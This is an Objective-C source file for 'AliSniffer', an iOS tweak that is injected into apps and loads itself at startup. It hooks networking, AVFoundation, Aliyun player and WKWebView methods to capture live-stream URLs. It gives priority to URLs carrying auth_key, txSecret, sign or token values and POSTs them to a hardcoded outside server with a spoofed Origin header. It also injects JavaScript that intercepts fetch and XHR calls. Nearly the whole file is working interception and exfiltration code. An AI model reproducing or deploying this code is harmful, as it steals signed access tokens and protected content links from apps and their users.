// AliSniffer.m  — 通用“直播源”嗅探器（已按你的服务器与弹窗习惯改好）
// 命中：m3u8/flv/rtmp/mp4/ts/php（常见直播入口）、优先含 auth_key/txSecret/txKey 等
// 上报：POST http://139.155.57.242:8088（X-Token: @Yy166431），raw->push_raw->push 兜底；text/plain
// 弹窗：注入成功提示；命中后弹窗+复制；去重60s
// 安全：只读不改；保存原实现；大量 try/catch；不开启 fishhook 也可运行
// 需要链接：UIKit / Foundation / WebKit / AVFoundation / CoreMedia

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

// ===== 配置 =====
static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString *> *kPushPaths(void) { return @[@"/api/push_raw", @"/push_raw", @"/push"]; }

static const NSTimeInterval kDedupeWindow = 60.0;  // 同一URL 60s 内不上报
static const BOOL kPopupBoot    = YES;             // 注入成功弹窗
static const BOOL kPopupOnAuth  = YES;             // auth_key/txSecret 等优先弹窗
static const BOOL kPopupOnPlain = YES;             // 普通URL也弹窗（你想静默就改 NO）

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[AliSniffer] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

// ===== 工具 =====
static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;

static inline void on_main(void(^blk)(void)) {
    if (!blk) return;
    if ([NSThread isMainThread]) blk();
    else dispatch_async(dispatch_get_main_queue(), blk);
}

static BOOL hasAuthLike(NSString *u) {
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    return [s containsString:@"auth_key="] ||
           [s containsString:@"txsecret="] ||
           [s containsString:@"txkey="]    ||
           [s containsString:@"sign="]     ||
           [s containsString:@"token="];
}

static BOOL looksLikeStream(NSString *u) {
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    // 常见直播后缀/协议
    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@".mp4"] ||
        [s containsString:@".ts"]   || [s hasPrefix:@"rtmp://"]) return YES;
    // 直播“网关”/入口（含 php/phonelive/replay/pull.* 等）
    if ([s containsString:@".php"] || [s containsString:@"phonelive"] ||
        [s containsString:@"replay"] || [s containsString:@"pull."] ||
        [s containsString:@"live"] ) return YES;
    // 授权参数
    if (hasAuthLike(u)) return YES;
    return NO;
}

static BOOL dedupe_skip(NSString *u) {
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u];
        NSDate *now  = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

static void popup(NSString *title, NSString *msg, NSString *copyText) {
    if (!msg) return;
    on_main(^{
        @try {
            UIWindow *win = nil;
            if (@available(iOS 13.0, *)) {
                for (UIWindowScene *sc in UIApplication.sharedApplication.connectedScenes) {
                    if (sc.activationState == UISceneActivationStateForegroundActive) {
                        for (UIWindow *w in sc.windows) if (w.isKeyWindow) { win = w; break; }
                        if (win) break;
                    }
                }
            } else {
                win = UIApplication.sharedApplication.keyWindow;
            }
            if (!win) win = UIApplication.sharedApplication.windows.firstObject;
            UIViewController *vc = win.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;

            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title
                                                                        message:msg
                                                                 preferredStyle:UIAlertControllerStyleAlert];
            if (copyText) {
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a) {
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        } @catch (NSException *e) { LOG(@"popup err:%@", e); }
    });
}

// 发送文本到你的服务器（raw -> push_raw -> push）
static void postText(NSString *text, void (^done)(BOOL ok)) {
    if (!text) { if(done)done(NO); return; }
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();

    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count) { if(done)done(NO); return; }
        NSString *p   = paths[idx++];
        NSString *url = [kPushHost stringByAppendingString:p];

        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];

        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e) {
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (!e && sc >= 200 && sc < 300) { if(done)done(YES); }
            else tryNext();
        }] resume];
    };
    tryNext();
}

static void handleURL(NSString *u, NSString *fromWho) {
    if (!u || !looksLikeStream(u)) return;
    if (dedupe_skip(u)) return;

    const BOOL auth = hasAuthLike(u);
    NSString *title = auth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
    NSString *msg   = fromWho ? [NSString stringWithFormat:@"%@\n%@", fromWho, u] : u;

    postText(u, ^(BOOL ok){
        LOG(@"POST %@ -> %@", u, ok?@"OK":@"FAIL");
        // 弹窗策略
        if (auth) {
            if (kPopupOnAuth) { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; }
        } else {
            if (kPopupOnPlain) { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; }
        }
    });
}

// ===== 兜底 Hook：NSURLSessionTask / AVPlayerItem / AVURLAsset =====
static void (*orig_task_resume)(id,SEL);
static void sn_task_resume(id self, SEL _cmd) {
    @try {
        NSURLRequest *req = nil;
        if ([self respondsToSelector:@selector(currentRequest)])
            req = ((NSURLRequest *(*)(id,SEL))objc_msgSend)(self, sel_getUid("currentRequest"));
        if (!req && [self respondsToSelector:@selector(originalRequest)])
            req = ((NSURLRequest *(*)(id,SEL))objc_msgSend)(self, sel_getUid("originalRequest"));
        NSString *s = req.URL.absoluteString;
        if (s.length) dispatch_async(gq, ^{ handleURL(s, @"NSURLSessionTask"); });
    } @catch (__unused NSException *e) {}
    if (orig_task_resume) orig_task_resume(self,_cmd);
}

static id (*orig_AVPI_url)(id,SEL,id);
static id sn_AVPI_url(id self, SEL _cmd, NSURL *URL) {
    @try { if (URL.absoluteString.length) dispatch_async(gq, ^{ handleURL(URL.absoluteString, @"AVPlayerItem"); }); } @catch (...) {}
    return orig_AVPI_url ? orig_AVPI_url(self,_cmd,URL) : nil;
}

static id (*orig_AVUA_urlopt)(id,SEL,id,id);
static id sn_AVUA_urlopt(id self, SEL _cmd, NSURL *URL, id opts) {
    @try { if (URL.absoluteString.length) dispatch_async(gq, ^{ handleURL(URL.absoluteString, @"AVURLAsset"); }); } @catch (...) {}
    return orig_AVUA_urlopt ? orig_AVUA_urlopt(self,_cmd,URL,opts) : nil;
}

// ===== 阿里云关键点：AVPUrlSource / AliPlayer（从 source 中取 url/playUrl） =====
static void hook_AVPUrlSource(void) {
    Class c = objc_getClass("AVPUrlSource"); if (!c) return;

    // +urlWithString:
    SEL cs = sel_getUid("urlWithString:");
    Method mcls = class_getClassMethod(c, cs);
    if (mcls) {
        IMP orig = method_getImplementation(mcls);
        IMP now  = imp_implementationWithBlock(^id(id _self, NSString *s){
            @try { if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AVPUrlSource.urlWithString"); }); } @catch (...) {}
            if (orig) { id (*fn)(id,SEL,NSString*) = (id(*)(id,SEL,NSString*))orig; return fn(_self,cs,s); }
            return (id)nil;
        });
        method_setImplementation(mcls, now);
    }

    // -setUrl:
    SEL is = sel_getUid("setUrl:");
    Method minst = class_getInstanceMethod(c, is);
    if (minst) {
        IMP orig = method_getImplementation(minst);
        IMP now  = imp_implementationWithBlock(^(id _self, NSString *s){
            @try { if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AVPUrlSource.setUrl"); }); } @catch (...) {}
            if (orig) { void (*fn)(id,SEL,NSString*) = (void(*)(id,SEL,NSString*))orig; fn(_self,is,s); }
        });
        method_setImplementation(minst, now);
    }
}

static void hook_AliPlayer(void) {
    Class c = objc_getClass("AliPlayer"); if (!c) return;

    // -setUrl:
    SEL su = sel_getUid("setUrl:");
    Method mu = class_getInstanceMethod(c, su);
    if (mu) {
        IMP orig = method_getImplementation(mu);
        IMP now  = imp_implementationWithBlock(^(id _self, NSString *s){
            @try { if (s.length) dispatch_async(gq, ^{ handleURL(s, @"AliPlayer.setUrl"); }); } @catch (...) {}
            if (orig) { void (*fn)(id,SEL,NSString*) = (void(*)(id,SEL,NSString*))orig; fn(_self,su,s); }
        });
        method_setImplementation(mu, now);
    }

    // -setStsSource: / -setAuthSource: / -setMpsSource:
    NSArray<NSString*> *sels = @[@"setStsSource:", @"setAuthSource:", @"setMpsSource:"];
    for (NSString *name in sels) {
        SEL s = sel_getUid(name.UTF8String);
        Method m = class_getInstanceMethod(c, s);
        if (!m) continue;
        IMP orig = method_getImplementation(m);
        IMP now  = imp_implementationWithBlock(^(id _self, id src){
            @try {
                NSString *u = nil;
                if ([src respondsToSelector:@selector(valueForKey:)]) {
                    @try { u = [src valueForKey:@"url"]; } @catch (...) {}
                    if (!u) { @try { u = [src valueForKey:@"playUrl"]; } @catch (...) {} }
                }
                if (u.length) dispatch_async(gq, ^{ handleURL(u, [@"AliPlayer." stringByAppendingString:name]); });
            } @catch (...) {}
            if (orig) { void (*fn)(id,SEL,id) = (void(*)(id,SEL,id))orig; fn(_self,s,src); }
        });
        method_setImplementation(m, now);
    }
}

// ===== ResourceLoader 代理：抓自定义 scheme / 现场签名的分片/清单 =====
static BOOL (*orig_res_shouldWait)(id,SEL,AVAssetResourceLoader*,AVAssetResourceLoadingRequest*);
static BOOL sn_res_shouldWait(id self, SEL _cmd, AVAssetResourceLoader *loader, AVAssetResourceLoadingRequest *req) {
    @try {
        NSURL *u = req.request.URL;
        if (u.absoluteString.length) dispatch_async(gq, ^{ handleURL(u.absoluteString, @"AVAssetResourceLoader.shouldWait"); });
    } @catch (...) {}
    return orig_res_shouldWait ? orig_res_shouldWait(self,_cmd,loader,req) : NO;
}

static BOOL (*orig_res_shouldRenew)(id,SEL,AVAssetResourceLoader*,id/*AVAssetResourceRenewableContentKeyRequest*/);
static BOOL sn_res_shouldRenew(id self, SEL _cmd, AVAssetResourceLoader *loader, id req) {
    @try {
        if ([req respondsToSelector:@selector(request)]) {
            id r = ((id(*)(id,SEL))objc_msgSend)(req, sel_getUid("request"));
            if ([r respondsToSelector:@selector(URL)]) {
                NSURL *u = ((NSURL*(*)(id,SEL))objc_msgSend)(r, sel_getUid("URL"));
                if (u.absoluteString.length) dispatch_async(gq, ^{ handleURL(u.absoluteString, @"AVAssetResourceLoader.renew"); });
            }
        }
    } @catch (...) {}
    return orig_res_shouldRenew ? orig_res_shouldRenew(self,_cmd,loader,req) : NO;
}

static void hook_delegate_method(Class dCls, SEL sel, IMP newImp, IMP *origStore) {
    if (!dCls || !sel || !newImp) return;
    Method m = class_getInstanceMethod(dCls, sel);
    if (m) {
        IMP orig = method_getImplementation(m);
        if (origStore) *origStore = orig;
        method_setImplementation(m, newImp);
    } else {
        // 如果原类没实现，也给它加一个（签名尽量兼容）
        class_addMethod(dCls, sel, newImp, "c@:@@");
    }
}

static void (*orig_ARL_setDelegate)(AVAssetResourceLoader*,SEL,id,dispatch_queue_t);
static void sn_ARL_setDelegate(AVAssetResourceLoader *self, SEL _cmd, id delegate, dispatch_queue_t q) {
    @try {
        if (delegate) {
            Class dCls = object_getClass(delegate);
            hook_delegate_method(dCls, sel_getUid("resourceLoader:shouldWaitForLoadingOfRequestedResource:"), (IMP)sn_res_shouldWait,  (IMP*)&orig_res_shouldWait);
            hook_delegate_method(dCls, sel_getUid("resourceLoader:shouldWaitForRenewalOfRequestedResource:"), (IMP)sn_res_shouldRenew, (IMP*)&orig_res_shouldRenew);
        }
    } @catch (...) {}
    if (orig_ARL_setDelegate) orig_ARL_setDelegate(self,_cmd,delegate,q);
}

static void hook_AVAssetResourceLoader(void) {
    Class c = objc_getClass("AVAssetResourceLoader");
    if (!c) return;
    Method m = class_getInstanceMethod(c, sel_getUid("setDelegate:queue:"));
    if (!m) return;
    orig_ARL_setDelegate = (void(*)(AVAssetResourceLoader*,SEL,id,dispatch_queue_t))method_getImplementation(m);
    method_setImplementation(m, (IMP)sn_ARL_setDelegate);
}

// ===== WKWebView：loadRequest 后只读注入 JS 拦 fetch/XHR =====
static void hook_WKWebView(void) {
    Class c = objc_getClass("WKWebView"); if (!c) return;
    SEL s = sel_getUid("loadRequest:");
    Method m = class_getInstanceMethod(c, s);
    if (!m) return;
    IMP orig = method_getImplementation(m);
    IMP now  = imp_implementationWithBlock(^(id self, NSURLRequest *req){
        @try {
            if (req.URL.absoluteString.length) dispatch_async(gq, ^{ handleURL(req.URL.absoluteString, @"WKWebView.loadRequest"); });
        } @catch (...) {}
        if (orig) { void(*fn)(id,SEL,NSURLRequest*)=(void(*)(id,SEL,NSURLRequest*))orig; fn(self,s,req); }
        on_main(^{
            @try {
                NSString *js =
                @"(function(){"
                " function sniff(u){try{if(!u)return; console.log('[sniffer]',u);}catch(e){}}"
                " var o=XMLHttpRequest.prototype.open; if(o){XMLHttpRequest.prototype.open=function(m,u){try{sniff(u);}catch(e){}; return o.apply(this,arguments);};}"
                " if(window.fetch){var f=window.fetch; window.fetch=function(){try{if(arguments&&arguments[0]) sniff(arguments[0].toString());}catch(e){}; return f.apply(this,arguments);};}"
                "})();";
                [(WKWebView*)self evaluateJavaScript:js completionHandler:nil];
            } @catch (...) {}
        });
    });
    method_setImplementation(m, now);
}

// ===== 入口 =====
__attribute__((constructor))
static void AliSnifferInit(void) {
    @try {
        if (!gq)    gq    = dispatch_queue_create("com.alisniffer.queue", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen = [NSMutableDictionary dictionary];

        if (kPopupBoot) popup(@"AliSniffer 已加载",
                              @"增强版已启用：auth_key 直通 + 多入口兜底（HTTP/AV/WK/ResourceLoader/阿里）",
                              nil);

        // NSURLSessionTask -resume
        Class task = objc_getClass("NSURLSessionTask");
        if (task) {
            Method m = class_getInstanceMethod(task, sel_getUid("resume"));
            if (m) { orig_task_resume=(void(*)(id,SEL))method_getImplementation(m);
                    method_setImplementation(m,(IMP)sn_task_resume); }
        }
        // AVPlayerItem
        Class avpi = objc_getClass("AVPlayerItem");
        if (avpi) {
            Method m = class_getClassMethod(avpi, sel_getUid("playerItemWithURL:"));
            if (m) { orig_AVPI_url=(id(*)(id,SEL,id))method_getImplementation(m);
                    method_setImplementation(m,(IMP)sn_AVPI_url); }
        }
        // AVURLAsset
        Class avua = objc_getClass("AVURLAsset");
        if (avua) {
            Method m = class_getClassMethod(avua, sel_getUid("URLAssetWithURL:options:"));
            if (m) { orig_AVUA_urlopt=(id(*)(id,SEL,id,id))method_getImplementation(m);
                    method_setImplementation(m,(IMP)sn_AVUA_urlopt); }
        }

        // 阿里云关键点
        hook_AVPUrlSource();
        hook_AliPlayer();

        // ResourceLoader 代理（抓自定义 scheme / 现场签名）
        hook_AVAssetResourceLoader();

        // WKWebView
        hook_WKWebView();

    } @catch (NSException *e) {
        LOG(@"bootstrap err: %@", e);
    }
}
